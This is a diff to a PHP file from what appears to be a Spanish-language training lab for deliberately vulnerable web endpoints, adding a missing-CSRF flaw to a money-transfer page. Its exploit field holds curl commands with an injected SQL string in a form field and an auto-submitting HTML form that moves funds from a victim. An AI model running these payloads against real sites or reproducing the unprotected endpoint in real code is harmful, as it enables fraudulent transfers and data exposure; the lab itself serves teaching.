@@ -6,6 +6,10 @@
  * VULNERABILIDADES:
  * 1. Failing open: Si algo falla, responde "success" igual
  * 2. Stack trace: Expone credenciales de la BD en errores
+ * 3. CSRF: No valida token anti-CSRF (vulnerabilidad histórica bonus)
+ * 
+ * La vulnerabilidad #3 permite que un atacante cree un formulario en
+ * su sitio malicioso que transfiera fondos de la víctima sin su conocimiento.
  * 
  * NO USAR EN PRODUCCION - Solo para fines educativos
  */
@@ -33,15 +37,33 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
         'id' => 'A10:2025',
         'name' => 'Mishandling of Exceptional Conditions',
         'difficulty' => 'Avanzada',
-        'description' => '<p>Este endpoint tiene dos vulnerabilidades en el manejo de errores.</p>',
-        'exploit' => '# Failing open
+        'description' => '
+            <p>Este endpoint tiene <strong>tres vulnerabilidades</strong>:</p>
+            <ol>
+                <li><strong>Failing open:</strong> Si algo falla, responde "success" igual</li>
+                <li><strong>Stack trace:</strong> Expone credenciales de la BD en errores</li>
+                <li><strong>CSRF (bonus):</strong> No valida token anti-falsificacion</li>
+            </ol>
+            <p class="mb-0"><small>CSRF es una vulnerabilidad historica incluida por completitud pedagogica.</small></p>
+        ',
+        'exploit' => '# 1. Failing open
 curl -X POST http://localhost:8082/a10_pagos/transferir.php -d "to_user=999&amount=100"
 
-# Stack trace
-curl -X POST http://localhost:8082/a10_pagos/transferir.php -d "to_user=\' OR 1=1--&amount=100"',
-        'prevention' => 'Ver transferir_secure.php',
+# 2. Stack trace
+curl -X POST http://localhost:8082/a10_pagos/transferir.php -d "to_user=\' OR 1=1--&amount=100"
+
+# 3. CSRF - Un atacante pone esto en su sitio:
+<form action="http://nexo.com/a10_pagos/transferir.php" method="POST">
+  <input type="hidden" name="to_user" value="666">
+  <input type="hidden" name="amount" value="50000">
+</form>
+<script>document.forms[0].submit()</script>',
+        'prevention' => 'Ver transferir_secure.php - incluye:
+- Fail closed
+- Sin stack trace
+- Token CSRF obligatorio',
         'caseStudy' => ['title' => 'Knight Capital (2012)', 'description' => '$440M perdidos por excepcion no manejada'],
-        'cwes' => ['CWE-636', 'CWE-209'],
+        'cwes' => ['CWE-636', 'CWE-209', 'CWE-352'],
         'tools' => ['curl'],
         'secureVersion' => 'transferir_secure.php',
     ];
